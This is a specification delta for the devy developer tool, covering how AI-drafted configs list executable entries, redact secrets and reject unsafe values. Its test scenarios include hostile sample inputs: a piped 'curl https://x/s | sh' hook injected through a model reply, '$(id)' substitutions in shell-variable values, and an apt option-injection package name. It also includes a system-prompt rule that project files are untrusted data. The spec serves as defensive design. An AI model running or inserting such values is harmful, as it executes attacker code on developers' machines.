# project-config delta

## ADDED Requirements

### Requirement: Executable entry listing
Where devy lists what a configuration will run (AI `init`'s review of a drafted `devy.yml`, and AI `doctor`'s list of the entries a suggested fix adds or changes), it SHALL group the entries under `Hooks`, `Install commands`, `Project setup`, `System packages`, `Package sources` and `Environment`:
- every hook command
- every `after_install` and `install_cmd`
- each implicit project setup step and the file that drives it (for example `npm install (package.json lifecycle scripts)`, `bundle install (Gemfile)`, `pip install -e . (pyproject.toml)`, `./gradlew (repository script)`, and for rust `cargo and rustc use toolchain and cargo settings from the project or its parent directories (<files>)` when `rust-toolchain`, `rust-toolchain.toml`, `.cargo/config` or `.cargo/config.toml` exists in the project or a parent directory below the user's home (listed relative to the project, e.g. `../.cargo/config.toml`), since they can name a path toolchain, `rustc-wrapper`, linkers or runners)
- every dependency installed through the package manager (every dependency that is not docker-managed), as its name, `@<version>` when one is set, and the backend `devy up` uses: `(nix)`, `(brew)`, `(sudo apt-get)` or `(winget)`, from `package_manager` and, when it is unset, the platform default; a dependency whose module installs another way is labelled with the route `devy up` really takes, including `sudo`: a module that always bypasses the package manager names its installer (`rust (rustup)`, `bun (bun-installer)`, `deno (deno-installer)`), and a module whose route depends on the backend names it for that backend (`ruby (rbenv via sudo apt-get)`, since apt installs rbenv and ruby-build before rbenv builds Ruby, `ruby (rbenv via nix)`, `ruby (rbenv via brew)` or `ruby (winget)`; `gcloud (brew)` or `gcloud (winget)`, and `gcloud (gcloud-installer)` on other backends). The config diff (doctor fixes, AI init) counts an added or changed package as an executable change
- every `tap` and `image`
- every `environment` entry, because shadowenv, `devy exec` and `devy export` apply them all; this includes every key that changes how programs run, such as `PATH`, any key starting with `LD_`, `DYLD_`, `GIT_CONFIG`, `npm_config_`, `NPM_CONFIG_`, `NIX_` or `__`, `NODE_OPTIONS`, `NODE_PATH`, `RUBYOPT`, `RUBYLIB`, `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, `PERL5OPT`, `PERL5LIB`, `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS`, `JDK_JAVA_OPTIONS`, `GIT_SSH_COMMAND`, `GIT_SSH`, `GIT_EXEC_PATH`, `GIT_PROXY_COMMAND`, `GIT_ASKPASS`, `GIT_EDITOR`, `GIT_PAGER`, `SSH_ASKPASS`, `SUDO_ASKPASS`, `BASH_ENV`, `ENV`, `fish_user_paths`, `EDITOR`, `VISUAL`, `PAGER`, `MANPAGER`, `LESSOPEN`, `LESSCLOSE`, `BROWSER`, `SHELL`, `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `LOCALAPPDATA`, `RUSTC`, `RUSTC_WRAPPER`, `RUSTDOC`, `CARGO`, `CC`, `CXX`, `LD`, and the names `mkShell`/stdenv evaluate in an export (`builder`, `args`, `stdenv`, keys ending in `Hook`, `Hooks` or `Phase`, and `pre`/`post` followed by an upper-case letter). Keys reserved for the interactive shell (such as `PROMPT_COMMAND`, `PS1`, `IFS`, `HOME`, `XDG_STATE_HOME` or `HISTFILE`) never reach the listing: loading the config refuses them first (Value validation)

Values SHALL be printed in full, with control characters stripped and whitespace runs collapsed. In `environment` values, the credential-looking parts the ai-assist value redaction recognizes (URL userinfo passwords, well-known token prefixes, secret-named assignments) SHALL always be replaced by `<redacted>`, so the listing never prints a secret to a terminal or CI log. A secret-named assignment inside a value SHALL hide only its own value, up to the next whitespace or quote, never the rest of the value (so `GIT_SSH_COMMAND="TOKEN=1 sh -c '…'"` keeps the command visible), and a value whose parts were hidden SHALL be followed by `(partly hidden; review it in devy.yml)`. (An unquoted spaced value of such an assignment, as in `password=correct horse`, therefore shows the words after the first; that note says the value needs review.) For a key that names a secret under the ai-assist key rule, the whole value SHALL be replaced by `<redacted>`, except as follows (keys are matched on whole words, split at `_`, `-`, `.` and camelCase):
- a switch value (`0`, `1`, `true`, `false`, `yes`, `no`, `on`, `off`) is shown for any key (`NODE_TLS_REJECT_UNAUTHORIZED=0`), and a mode word (`never`, `prefer`, `force`, `always`, `auto`) for any key that does not name a credential outright (`SSH_ASKPASS_REQUIRE=force`);
- `GIT_CONFIG_KEY_<n>` names a git config key, not a secret, and is shown;
- a key that names a credential outright (a word `PASSWORD`, `PASSWD`, `PWD`, `TOKEN`, `SECRET`, `PRIVATE`, `KEY`, `APIKEY`, `AUTH`, `COOKIE`, `SESSION`, `DSN`, `SIG`, `SIGNATURE`, `SALT`, `PAT`, `PIN`, `CREDS` or `PW`, or a plural; a word `CREDENTIAL`, `KEYSTORE`, `KEYRING` or `KEYCHAIN`; `PASS`, `TOKEN` or `SECRET` inside a word; or a word ending in `KEY` or `AUTH`; not `*ASKPASS`, the `AUTH` of `*_AUTH_SOCK` or the `SESSION` of `DBUS_*`) shows only a reference to a program: a path when its last word is `FILE`, `DIR` or `PATH` (`ANSIBLE_VAULT_PASSWORD_FILE=./x` or `scripts/vault.sh`), or, when its last word is `OPTIONS` or `OPTS`, a value whose first word starts with `-` or like a path (`PASSWORD_STORE_GPG_OPTS=--no-throw-keyids`), or, when its last word is a command word (`COMMAND`, `HELPER`, `CMD`, `PROVIDER`, `PROVIDERS`, or ending in `COMMAND` as in `BORG_PASSCOMMAND`; so `CARGO_REGISTRY_CREDENTIAL_PROVIDER`, `CARGO_REGISTRIES_<name>_CREDENTIAL_PROVIDER` and `CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS` are command keys), a bare program name (letters, `-`, `_` and `.` only, as in `GIT_CREDENTIAL_HELPER=osxkeychain`) or a command whose first word starts like a path or is a common secret-printing program (`sh`, `bash`, `op`, `pass`, `gpg`, `security`, `vault`, `aws`, `curl`, …), any of whose words starts like a path, or that contains whitespace and a shell operator (`|`, `;`, `&&`, `$(`, a backtick, `<`, `>`), so a passphrase such as `correct horse` stays hidden (a command matching none of these, such as `npx pkg`, is shown as `<redacted> (a command; review it in devy.yml)`);
- a key whose last word ends in `ASKPASS` names the program that asks for a password, never the password, and its value is always shown;
- a program key (last word a command word, `OPTIONS`, `OPTS` or `PATH`; first word `LD` or `DYLD`) shows: for a command word, a command as above or a bare program name (letters, `-`, `_` and `.` only); for `OPTIONS` or `OPTS`, a value whose first word starts with `-` or like a path; otherwise a path or a value that contains whitespace;
- a file or socket key (a word `CERT`, `CERTS`, `CA` or `CREDENTIALS`, last word `SOCK`, first word `DBUS`, or `XAUTHORITY`) shows a value without whitespace that starts like a path, or is a relative path of plain segments ending in a certificate, key, credentials or config extension (`pem`, `crt`, `cer`, `der`, `key`, `p12`, `pfx`, `json`, `jks`, `ini`, `toml`, `yaml`, `yml`, `sock`, `conf`), a relative path of plain segments with a `/` or `\` (`certs/evil`; for a `*CREDENTIALS` key only when its last word is `FILE`, `DIR` or `PATH`, since `user/password` is a credential), or, for a `DBUS_*` or `*SOCK` key, a `unix:path=`/`unix:abstract=` address.

A path, here, is a value without whitespace that starts like a path (`/`, `./`, `../`, `~/`, `\` or a drive letter), is a relative path of plain segments (letters, digits, `.`, `-`, `_`) separated by `/` or `\` (`scripts/askpass.sh`), or is a bare file name with an extension (`vault.sh`); a bare word without an extension (`hunter8`) is not, since it is as likely a password. Whenever a whole value is replaced by `<redacted>`, it SHALL be followed by `(may name a program or file; review it in devy.yml)` (or, under a command word, `(a command; review it in devy.yml)`), unless the key's last word names the secret itself (`PASSWORD`, `PASSWD`, `PASS`, `PASSPHRASE`, `PWD`, `TOKEN`, `SECRET`, `KEY`, `APIKEY`, `PIN`, `AUTH`, `SALT`, `SIG`, `SIGNATURE` or `CREDENTIAL`, or a plural) and the key is not also a program or file key. So `API_TOKEN=<redacted>` has no note, while a hidden `PASSWORD_STORE_GPG_OPTS`, `MY_PASSWORD_MODE` or `SONATYPE_CREDENTIALS` (a file key) value has one.

A value's shape alone never reveals a value under a credential name: passwords can contain spaces, `&`, `:` or `/`. So `GIT_ASKPASS=./scripts/x.sh`, `GIT_ASKPASS=scripts/askpass.sh`, `NODE_EXTRA_CA_CERTS=certs/evil` and `SSL_CERT_FILE=/tmp/ca.pem` are shown, while `API_TOKEN=ghp_…`, `DB_PASSWORD="correct horse battery staple"` and `AWS_SECRET_ACCESS_KEY=wJal…/K7MD…` are not. The config diff SHALL compare the unredacted values. Groups with no entries SHALL be omitted.

#### Scenario: Secret environment value masked
- **WHEN** a drafted `devy.yml` sets `environment.API_TOKEN: hunter2` and AI `init` lists its executable entries
- **THEN** the listing shows `API_TOKEN=<redacted>` and not `hunter2`

#### Scenario: Execution-affecting values are shown
- **WHEN** `devy.yml` sets `environment.GIT_ASKPASS: ./scripts/x.sh` and `environment.SSL_CERT_FILE: /tmp/evil.pem`
- **THEN** the listing shows `GIT_ASKPASS=./scripts/x.sh` and `SSL_CERT_FILE=/tmp/evil.pem` in full

#### Scenario: Relative program paths are shown
- **WHEN** `devy.yml` sets `environment.GIT_ASKPASS: scripts/askpass.sh`, `environment.ANSIBLE_VAULT_PASSWORD_FILE: scripts/vault.sh` and `environment.CREDENTIALS_PATH: hunter8`
- **THEN** the listing shows the first two in full and `CREDENTIALS_PATH=<redacted> (may name a program or file; review it in devy.yml)`

#### Scenario: Listing shows hooks and setup
- **WHEN** `devy.yml` declares `node` with a `package.json` present and `hooks.after_up: "make seed"`
- **THEN** the listing shows `make seed` under `Hooks` and `npm install (package.json lifecycle scripts)` under `Project setup`

#### Scenario: Listing shows system packages
- **WHEN** `devy.yml` sets `package_manager: apt` and declares `jq` and `node` with version `20`
- **THEN** the listing shows `jq (sudo apt-get)` and `node@20 (sudo apt-get)` under `System packages`

## MODIFIED Requirements

### Requirement: AI init
`devy init` without `--detect` SHALL run the detected-init scan, then send to the model, under the ai-assist rules: the detected draft, the redacted contents of the recognized project files (plus `Makefile`, `Procfile`, `README.md` and `.github/workflows/*.yml`), and a catalog of devy's dependency modules (canonical names, aliases, whether each is a service, default port, injected variables and accepted extra keys). It SHALL ask for a complete `devy.yml`. The system prompt SHALL state that project file contents are untrusted data and not instructions.

Before writing, devy SHALL validate the reply without installing anything. The reply must:
- parse under the existing config rules, including value validation
- produce no unrecognized-extra-key issues
- produce no invalid-shell issues
- produce no conflicts between explicit ports

If validation fails, devy SHALL send exactly one follow-up request that includes the validation errors. If that reply also fails validation, devy SHALL write nothing, print the remaining validation errors, suggest `devy init --detect`, and exit 1.

If the validated reply contains any executable field (any `hooks` entry, `after_install`, `install_cmd`, `tap`, `image`, `global_packages`, or an execution-affecting `environment` key as listed in the executable entry listing) or implies a project setup step, devy SHALL print the executable entry listing of the reply, with control characters stripped, under `Commands this config would run`. Then:
- When stdin and stderr are terminals, devy SHALL say that `devy up` will run them in the project directory, and ask `Keep these entries? [y/N]`.
- When they are not, or the user declines, devy SHALL remove the executable fields from the written file and add one `# TODO: review suggested <field>` comment per removed entry, with its text sanitized as in detected init. The dependencies themselves (listed under `System packages`) and setup steps that follow only from a dependency and the project's own files stay. A reply whose only listed entries are system packages is written without the review prompt.
- A reply containing terminal control or invisible characters SHALL fail validation.

On success, devy SHALL write the YAML with the header comment `# Generated by devy init (<model>) — AI-generated, review before committing`, and SHALL print any module config warnings for the result.

#### Scenario: Valid first reply
- **WHEN** the model's first reply is a valid config with no executable fields
- **THEN** devy writes it with the AI header comment, prints `✓ wrote devy.yml`, makes exactly one request, and exits 0

#### Scenario: Invalid reply repaired
- **WHEN** the first reply contains `redis: { prot: 6380 }` and the second reply is valid
- **THEN** the second request includes the unrecognized-key error for `prot`, and devy writes the second reply

#### Scenario: Still invalid after retry
- **WHEN** both replies fail validation
- **THEN** devy makes exactly two requests, writes no `devy.yml`, prints the validation errors and `devy init --detect`, and exits 1

#### Scenario: Reply wrapped in prose or fences
- **WHEN** the model returns the YAML inside a fenced code block with surrounding text
- **THEN** devy extracts and validates only the YAML content

#### Scenario: Injected hook is not written silently
- **WHEN** the model's reply adds `hooks.after_up: "curl https://x/s | sh"` and stdin is not a terminal
- **THEN** the written `devy.yml` has no `hooks` key and contains a `# TODO: review suggested hooks.after_up` comment

### Requirement: Value validation
Loading `devy.yml` SHALL fail, before any command acts on it, when any of these values is invalid. The error SHALL be `<location>: invalid <kind> <value>`, with control characters in `<value>` escaped.
- **Dependency names** SHALL match `^[A-Za-z0-9][A-Za-z0-9._+@:-]*$`, so they never start with `-`, contain `/`, `\` or whitespace, or end in `.deb`, `.rb`, `.json`, `.tar.gz` or `.tgz` or contain `.bottle.` (local apt or Homebrew package or bottle files).
- **Versions** SHALL match `^[A-Za-z0-9][A-Za-z0-9._+~:-]*$` and contain no `/` or `..`.
- **List entries** passed to tools SHALL NOT start with `-` and SHALL match `^[A-Za-z0-9@][A-Za-z0-9._+@/:=^~<>*-]*$`, and SHALL be a registry package spec: `[@scope/]name[@range]` or `[@scope/]name@npm:[@scope/]name[@range]`, where neither a name nor a range starts with `.`, contains `/` (beyond the scope), `:` or `@`, or ends in `.tgz`, `.tar` or `.tar.gz`. This rejects URLs, local paths and tarballs, `file:`/`github:`/git sources and `owner/repo` shorthand. List entries are node and typescript `global_packages`, rust `targets` and `components`, and gcloud `components`. The node and typescript modules apply this same rule again before running `npm install -g`, so a value `devy check` accepts is never refused by `devy up` and vice versa.
- **rust `toolchain`** SHALL match `^[A-Za-z0-9][A-Za-z0-9._-]*$`.
- **python `venv_path`** SHALL be relative, contain no `..` component, and not be the project root itself.
- **Command names** SHALL match `^[A-Za-z0-9][A-Za-z0-9_.:-]*$`.
- **`cwd`** on commands and hooks SHALL be relative, SHALL contain no `\`, `:`, segment ending in `.` or a space, or Windows device name, and SHALL resolve inside the project root (after following symlinks, and on Windows also after dropping the `\\?\` prefix), and relative `cwd` SHALL resolve against the project root, not the process working directory.
- **`environment` keys** SHALL match `^[A-Za-z_][A-Za-z0-9_]*$`, and SHALL NOT be a name that, assigned in the running interactive shell (shadowenv exports every entry there), makes that shell run code or act on files by itself, changes how it parses or runs every command, or defeats the shell hook (shell-integration) and shadowenv. The reserved names are taken from the variables bash ("Bourne Shell Variables", "Bash Variables"), zsh (zshparam "Parameters Used By The Shell", and its hook arrays) and fish ("Special variables", and the variables fish's own functions watch) document, each classified by what it does in the running shell:
  - the working directory: `PWD`, `OLDPWD`; devy's state directory, where the hook finds devy's copies: `HOME`, `XDG_STATE_HOME`;
  - parsing and expansion of every command: `IFS`, `SHELLOPTS`, `BASHOPTS`, `BASH_COMPAT`, `POSIXLY_CORRECT`, `GLOBIGNORE` (which also turns on `dotglob`), `KEYBOARD_HACK`, `histchars` (bash and zsh: the history expansion and comment characters), zsh's `HISTCHARS`;
  - the prompt hooks: `PROMPT_COMMAND`, `precmd_functions`, `preexec_functions`, and starship's copy of `PROMPT_COMMAND` under its current and pre-1.19 names, `STARSHIP_PROMPT_COMMAND`, `_PRESERVED_PROMPT_COMMAND`; other functions the shell calls by name: `chpwd_functions`, `periodic_functions`, `zshaddhistory_functions`, `zshexit_functions`, `zsh_directory_name_functions`, `fish_key_bindings`;
  - strings the shell expands, running their command substitutions: the prompts `PS0` to `PS4`, `PROMPT`, `PROMPT2` to `PROMPT4`, `prompt`, `RPROMPT`, `RPROMPT2`, `RPS1`, `RPS2`, `SPROMPT`, `PROMPT_EOL_MARK` (bash with `promptvars`, its default, and zsh with `PROMPT_SUBST`), the mail messages `MAILPATH`, `mailpath`, and bash's `$"..."` translations `TEXTDOMAIN`, `TEXTDOMAINDIR`; the rest of the mail check, `MAIL` and `MAILCHECK` (the shell checks the files they set before a prompt);
  - which commands and functions run, the guard's included: `EXECIGNORE`, `FUNCNEST`, `BASH_ALIASES`, `BASH_CMDS`, bash's `auto_resume`, `NULLCMD`, `READNULLCMD`; where code is loaded from: `fish_function_path`, `fish_complete_path`, `FPATH`, `fpath`, `module_path`, `MODULE_PATH`, `BASH_LOADABLES_PATH`;
  - files the shell reads or runs by itself: `ZDOTDIR` (a zsh login shell sources `$ZDOTDIR/.zlogout` when it exits); `TMOUT`, which makes the shell exit by itself;
  - numbers the shell evaluates as arithmetic, where an array subscript in the value (`PATH[$(cmd)]`) runs its command substitution: zsh's integer specials, evaluated when assigned (`SHLVL`, `LINES`, `COLUMNS`, `ZLE_RPROMPT_INDENT`, `LINENO`, `OPTIND`, `TRY_BLOCK_ERROR`, `TRY_BLOCK_INTERRUPT`, `RANDOM`, `SECONDS`, `ERRNO`, `KEYTIMEOUT`, `LISTMAX`, and `UID`, `EUID`, `GID`, `EGID`, whose value is evaluated before zsh tries to set the id), the numbers zsh evaluates when it uses them (`PERIOD`, `DIRSTACKSIZE`, `LOGCHECK`, `BAUD`, `REPORTTIME`, `REPORTMEMORY`, `MENUSCROLL`), and bash's integer variables (`OPTIND`, `HISTCMD`, `RANDOM`, `SRANDOM`, `SECONDS`); fish does no arithmetic on assignment. An integer variable declared by the user's own rc file or a module (`typeset -i`, `declare -i`) is evaluated the same way, but its name can't be known to devy and is not reserved;
  - files the shell writes or truncates and descriptors it closes: `HISTFILE`, `HISTFILESIZE`, `HISTSIZE`, `SAVEHIST`, `fish_history`, `BASH_XTRACEFD`, `TMPPREFIX`, `TMPSUFFIX`;
  - zsh's special tables of its own state (the `zsh/parameter` and `zsh/zleparameter` modules), which a scalar assignment would clobber and some of which hold code: `options`, `commands`, `functions`, `functions_source`, `builtins`, `reswords`, `patchars`, `aliases`, `galiases`, `saliases` (each also with its `dis_` variant), `parameters`, `modules`, `dirstack`, `history`, `historywords`, `jobdirs`, `jobtexts`, `jobstates`, `nameddirs`, `userdirs`, `usergroups`, `funcfiletrace`, `funcsourcetrace`, `funcstack`, `functrace`, `keymaps`, `widgets`;
  - names starting with `_devy_`, `__devy_`, `__shadowenv_`, `__hookbook_` (the hook's and shadowenv's state), `__fish_` (fish's state; its theme hook sources a file under `$__fish_config_dir`) or `BASH_FUNC_` (shell functions).

  Names are compared case-sensitively and reserved only in the case a shell uses them (`histchars` and `HISTCHARS` both; `ps1` or `pwd` stay allowed). Such a key SHALL fail with ``environment: invalid key "<KEY>" (<reason>); remove it from `environment` in devy.yml``, the reason naming its category. Variables that only change the programs the shell starts, or shells started later, stay allowed and are listed in the executable entry listing like every entry: `PATH`, zsh's `path`, fish's `fish_user_paths` (from which fish rebuilds `PATH`), `CDPATH`, `BASH_ENV`, `ENV`, `INPUTRC`, `TMPDIR`, the locale, the dynamic loader's variables (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `GCONV_PATH`, `LOCPATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `DYLD_FRAMEWORK_PATH`, `DYLD_FALLBACK_LIBRARY_PATH`, `DYLD_FALLBACK_FRAMEWORK_PATH`, `DYLD_VERSIONED_LIBRARY_PATH`, `DYLD_VERSIONED_FRAMEWORK_PATH`, `DYLD_ROOT_PATH`), which projects use for their own programs (the shell hook's guard empties the ones that load code for its own utilities, shell-integration), and settings with no such effect such as `FIGNORE`, `HISTIGNORE`, `POSTEDIT` (printed, not expanded), `STTY` or `WORDCHARS`.

#### Scenario: Shell-reserved environment key
- **WHEN** `devy.yml` sets `environment: { PWD: /tmp }`
- **THEN** loading fails with ``environment: invalid key "PWD" (the shell keeps it for the working directory); remove it from `environment` in devy.yml``

#### Scenario: Autoload path environment key
- **WHEN** `devy.yml` sets `environment: { fish_function_path: ./fns }` (or `FPATH`)
- **THEN** loading fails with ``environment: invalid key "fish_function_path" (the shell loads functions or modules from it); remove it from `environment` in devy.yml``

#### Scenario: Mail check environment key
- **WHEN** `devy.yml` sets `environment: { MAILPATH: "/tmp/m?$(id)" }`
- **THEN** loading fails with ``environment: invalid key "MAILPATH" (the shell checks the mail files it names before a prompt and expands their messages, running the commands in them); remove it from `environment` in devy.yml``

#### Scenario: History file environment key
- **WHEN** `devy.yml` sets `environment: { HISTFILE: ./history }`
- **THEN** loading fails with ``environment: invalid key "HISTFILE" (it changes which files the shell writes, truncates or closes); remove it from `environment` in devy.yml``

#### Scenario: Arithmetic environment key
- **WHEN** `devy.yml` sets `environment: { SHLVL: "PATH[$(id)]" }` (or `LINES`, `COLUMNS`, `REPORTTIME`)
- **THEN** loading fails with ``environment: invalid key "SHLVL" (the shell evaluates its value as arithmetic, which runs the commands in an array subscript in it); remove it from `environment` in devy.yml``

#### Scenario: Option-like dependency name
- **WHEN** `devy.yml` lists a dependency named `-oDPkg::Pre-Invoke::=id`
- **THEN** every command that loads the config fails with an invalid-name error and nothing is installed

#### Scenario: Local package path as name
- **WHEN** `devy.yml` lists a dependency named `./evil.deb`
- **THEN** loading fails with an invalid-name error

#### Scenario: Shell metacharacters in a version
- **WHEN** `deno` is declared with `version: "1.0;id"`
- **THEN** loading fails with an invalid-version error

#### Scenario: Command name with substitution
- **WHEN** `commands` has a key `$(id>/tmp/p)`
- **THEN** loading fails with an invalid command name error

#### Scenario: cwd escaping the project
- **WHEN** a command sets `cwd: ../../`
- **THEN** loading fails with an invalid cwd error
